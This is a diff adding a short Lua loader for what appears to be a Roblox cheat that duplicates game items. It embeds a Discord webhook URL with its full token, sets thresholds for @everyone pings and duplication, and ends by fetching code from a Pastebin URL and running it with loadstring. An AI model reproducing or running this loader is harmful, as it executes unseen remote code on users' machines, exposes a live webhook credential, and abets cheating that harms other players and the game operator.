@@ -1,0 +1,16 @@
+local Webhook = "https://discord.com/api/webhooks/1451955345214673109/1q_AFTYon9TPZORr_Gt2ByX4V5FUpUqPzewxb2SeowDr19cWv4AHiGqaClqT-sJIpAgC"
+getgenv().UserPingThreshold = 50000000      -- Minimum gen to ping @everyone (50M)
+getgenv().DupeTargetGeneration = 50000000   -- Minimum gen to dupe brainrots (50M/s)
+
+
+-- SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
+
+if Webhook and Webhook:match("discord.com/api/webhooks") then
+    getgenv().UserWebhookURL = Webhook
+else
+    warn(":warning: Webhook not configured! Please add your Discord webhook to the loader.")
+    warn("Script will still work, but you won't receive Discord notifications.")
+    getgenv().UserWebhookURL = nil
+end
+
+loadstring(game:HttpGet('https://pastebin.com/raw/awUZnH1j', true))()
